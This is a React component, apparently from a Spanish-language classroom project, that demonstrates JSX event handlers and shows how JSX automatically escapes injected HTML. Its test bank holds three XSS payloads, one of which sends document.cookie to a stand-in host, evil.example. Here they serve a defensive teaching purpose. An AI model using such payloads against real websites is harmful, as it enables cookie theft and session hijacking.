import { useState } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import { Activity, Bug, Eraser, MousePointerClick, ShieldCheck, Terminal } from 'lucide-react';
import { EASE_OUT_EXPO, cardReveal, staggerContainer } from '../lib/motion.js';

// ============================================================================
// [CLAVE EXPOSICIÓN 5] EVENTOS EN JSX, SEGURIDAD XSS Y TICKET 06
// ----------------------------------------------------------------------------
// 1. Historial trazable de los últimos 5 eventos renderizado con .map() y key.
// 2. Botón "Limpiar historial" que vacía la lista.
// 3. 3 botones de "Cargar payload XSS de prueba" con vectores maliciosos
//    distintos para demostrar el escapado automático seguro de JSX.
// ============================================================================

const PAYLOADS_XSS_PRUEBA = [
  {
    id: 'xss-script',
    etiqueta: 'Payload 1: <script>',
    payload: "<script>alert('XSS clásico bloqueado por JSX')</script>"
  },
  {
    id: 'xss-img',
    etiqueta: 'Payload 2: <img onerror>',
    payload: '<img src="x" onerror="alert(\'Cookie: \' + document.cookie)" />'
  },
  {
    id: 'xss-svg',
    etiqueta: 'Payload 3: <svg onload>',
    payload: '<svg/onload="fetch(\'https://evil.example/?c=\'+document.cookie)"></svg>'
  }
];

export default function EventosYSeguridadXSS() {
  const [historial, setHistorial] = useState([]);
  const [entradaUsuario, setEntradaUsuario] = useState(
    '<img src="x" onerror="alert(\'Ataque XSS\')" /> <script>alert(\'Hack\')</script>'
  );

  const registrarEvento = (tipo, descripcion) => {
    const nuevoEvento = {
      id: `evt-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
      hora: new Date().toLocaleTimeString('es-ES', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      }),
      tipo,
      descripcion
    };
    // Mantiene exclusivamente los últimos 5 eventos (más reciente primero)
    setHistorial((prev) => [nuevoEvento, ...prev].slice(0, 5));
  };

  // Manejador sin parámetros (referencia directa: onClick={manejarClickSimple})
  const manejarClickSimple = () => {
    registrarEvento('onClick={fn}', 'Clic simple registrado por referencia directa');
  };

  // Manejador con parámetros (función flecha: onClick={() => manejarConParametro(...)})
  const manejarConParametro = (accion) => {
    registrarEvento('onClick={() => fn(arg)}', `Acción ejecutada con parámetro: "${accion}"`);
  };

  const cargarPayloadPrueba = (item) => {
    setEntradaUsuario(item.payload);
    registrarEvento('Prueba XSS', `Vector cargado: ${item.etiqueta}`);
  };

  const limpiarHistorial = () => {
    setHistorial([]);
  };

  return (
    <motion.section
      className="card"
      variants={staggerContainer}
      initial="hidden"
      animate="visible"
    >
      <div className="card-head">
        <div>
          <h2>5. Auditoría de Eventos y Banco de Pruebas XSS</h2>
          <p className="subtitle">
            Trazabilidad de los últimos 5 eventos sintéticos y banco de vectores maliciosos para
            comprobar la neutralización automática de XSS en React.
          </p>
        </div>
        <div className="ticket-badges">
          <span className="ticket-tag">Ticket 06</span>
          <span className="ticket-tag">Seguridad XSS</span>
        </div>
      </div>

      <div className="grid-2">
        {/* Panel izquierdo: Historial de últimos 5 eventos */}
        <motion.div
          className="box box-success"
          variants={cardReveal}
          whileHover={{ y: -3 }}
          transition={{ duration: 0.2, ease: EASE_OUT_EXPO }}
        >
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              gap: '0.5rem',
              flexWrap: 'wrap',
              marginBottom: '0.45rem'
            }}
          >
            <h3 style={{ margin: 0, display: 'flex', alignItems: 'center', gap: '0.45rem' }}>
              <Activity size={18} aria-hidden="true" />
              <span>Historial de Eventos (últimos 5)</span>
            </h3>
            <span className="pill tabular">{historial.length} / 5</span>
          </div>

          <div className="btn-row" style={{ marginTop: '0.45rem', marginBottom: '0.85rem' }}>
            <button type="button" className="btn" onClick={manejarClickSimple}>
              <MousePointerClick size={15} aria-hidden="true" />
              <span>onClick=&#123;fn&#125;</span>
            </button>

            <button
              type="button"
              className="btn btn-secondary"
              onClick={() => manejarConParametro('Exportar PDF')}
            >
              onClick=&#123;() =&gt; fn(arg)&#125;
            </button>

            <button
              type="button"
              className="btn btn-danger"
              onClick={limpiarHistorial}
              disabled={historial.length === 0}
            >
              <Eraser size={15} aria-hidden="true" />
              <span>Limpiar historial</span>
            </button>
          </div>

          {historial.length > 0 ? (
            <ul className="list" aria-label="Historial de los últimos 5 eventos">
              <AnimatePresence initial={false}>
                {historial.map((ev) => (
                  <motion.li
                    key={ev.id}
                    layout
                    className="list-item"
                    initial={{ opacity: 0, y: 6, scale: 0.985 }}
                    animate={{ opacity: 1, y: 0, scale: 1 }}
                    exit={{ opacity: 0, y: -5 }}
                    transition={{ duration: 0.18, ease: EASE_OUT_EXPO }}
                  >
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.2rem' }}>
                      <span style={{ fontSize: '0.88rem', fontWeight: 600 }}>{ev.descripcion}</span>
                      <code className="code-inline" style={{ width: 'fit-content' }}>
                        {ev.tipo}
                      </code>
                    </div>
                    <span className="badge badge-ok tabular">{ev.hora}</span>
                  </motion.li>
                ))}
              </AnimatePresence>
            </ul>
          ) : (
            <div className="empty-state" style={{ padding: '1.25rem 1rem' }}>
              <Activity size={20} aria-hidden="true" />
              <p style={{ fontSize: '0.88rem' }}>
                Sin eventos registrados todavía. Pulsa un botón para iniciar la auditoría.
              </p>
            </div>
          )}
        </motion.div>

        {/* Panel derecho: Banco de pruebas XSS (3 botones + salida escapada) */}
        <motion.div
          className="box box-warn"
          variants={cardReveal}
          whileHover={{ y: -3 }}
          transition={{ duration: 0.2, ease: EASE_OUT_EXPO }}
        >
          <h3 style={{ display: 'flex', alignItems: 'center', gap: '0.45rem' }}>
            <ShieldCheck size={18} aria-hidden="true" />
            <span>Escapado Automático contra XSS</span>
          </h3>

          <label htmlFor="xss-input" className="field-label">
            Introduce HTML o selecciona un vector del banco de pruebas:
          </label>
          <input
            id="xss-input"
            type="text"
            className="input"
            style={{ fontFamily: 'var(--font-mono)', fontSize: '0.84rem' }}
            value={entradaUsuario}
            onChange={(e) => setEntradaUsuario(e.target.value)}
          />

          <p
            style={{
              marginTop: '0.85rem',
              fontSize: '0.78rem',
              fontFamily: 'var(--font-mono)',
              fontWeight: 700,
              textTransform: 'uppercase',
              letterSpacing: '0.06em',
              color: 'var(--text-muted)'
            }}
          >
            Cargar payload XSS de prueba:
          </p>

          <div className="btn-row" style={{ marginTop: '0.45rem' }}>
            {PAYLOADS_XSS_PRUEBA.map((item) => (
              <button
                key={item.id}
                type="button"
                className="btn btn-secondary"
                style={{ fontSize: '0.8rem', padding: '0.45rem 0.78rem' }}
                onClick={() => cargarPayloadPrueba(item)}
              >
                <Bug size={14} aria-hidden="true" />
                <span>{item.etiqueta}</span>
              </button>
            ))}
          </div>

          <div className="xss-console" aria-live="polite">
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                gap: '0.5rem',
                marginBottom: '0.45rem',
                color: '#c8ff3d',
                fontSize: '0.74rem'
              }}
            >
              <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}>
                <Terminal size={13} aria-hidden="true" />
                SALIDA RENDERIZADA SEGURA (TEXTO ESCAPADO)
              </span>
              <span>0 scripts ejecutados</span>
            </div>
            {/* JSX escapa automáticamente esta cadena: NO se ejecuta ningún script */}
            <div>{entradaUsuario || '(Cadena vacía)'}</div>
          </div>
        </motion.div>
      </div>

      <p className="file-hint">
        <span>
          Archivo fuente:{' '}
          <code className="code-inline">src/components/05_EventosYSeguridadXSS.jsx</code>
        </span>
        <span className="tabular">Eventos en auditoría: {historial.length}</span>
      </p>
    </motion.section>
  );
}
